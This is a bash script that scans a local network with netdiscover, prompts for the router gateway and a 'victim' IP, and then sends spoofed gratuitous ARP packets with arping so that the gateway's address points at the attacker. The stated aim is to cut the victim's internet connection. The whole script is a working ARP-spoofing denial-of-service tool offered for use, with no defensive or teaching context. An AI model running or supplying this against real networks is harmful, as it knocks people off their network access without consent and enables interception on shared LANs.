#!/bin/bash

#Author:
 # _   .-')             _  .-')     _ (`-.  ('-. .-.                                
 #( '.( OO )_          ( \( -O )   ( (OO  )( OO )  /                                
 #,--.   ,--.) .----.  ,------.  _.`     \,--. ,--. .-----.  ,--. ,--.   .------.  
 #|   `.'   | /  ..  \ |   /`. '(__...--''|  | |  |/  -.   \ |  | |  |   |   ___|  
 #|         |.  /  \  .|  /  | | |  /  | ||   .|  |'-' _'  | |  | | .-') |  '--.   
 #|  |'.'|  ||  |  '  ||  |_.' | |  |_.' ||       |   |_  <  |  |_|( OO )`---.  '. 
 #|  |   |  |'  \  /  '|  .  '.' |  .___.'|  .-.  |.-.  |  | |  | | `-' /.-   |  | 
 #|  |   |  | \  `'  / |  |\  \  |  |     |  | |  |\ `-'   /('  '-'(_.-' | `-'   / 
 #`--'   `--'  `---''  `--' '--' `--'     `--' `--' `----''   `-----'     `----''  
#Designed to cut net of the user using Gratuitous arp

sysctl net.ipv4.ip_nonlocal_bind=1
ip -s -s neigh flush all >/dev/null

echo "Netdiscover and Arping needed to be installed | Run as Root"

echo -e "Begin \n"
echo -e "enter your interface define in ifconfig"
read niccard
echo -e "check network address"


echo -e "Checking for Netdiscover \n"
ND="/usr/sbin/netdiscover"

if [ -f $ND ];
then
echo "Netdiscover found "

fi

echo -e "Starting Netdiscover \n" 
echo -e "enter ip block to arp and enter ip range"
read NA 
netdiscover -P -r $NA 



echo "Gateway of interface connected"

timeout 2s route -n 

echo -e "Enter gateway address of Router \n"
read gateway 

echo -e "Checking for Arping \n"
AR="/usr/sbin/arping"
if [ -f $AR ]
then
echo "Arping found"
echo "Ready to cut internet of victim \n"
echo "Select IP of Victim from netdiscover output \n | enter victims ip"
read victims_ip

arping -b -A -i $niccard -S $gateway $victims_ip 

echo "Net has been cut off \n"

else
echo -e "Arping not found | Install using apt-get install arping\n"
exit
fi



## Capture SIGINT (Ctrl-C) and exit the script clean.
trap control_c SIGINT



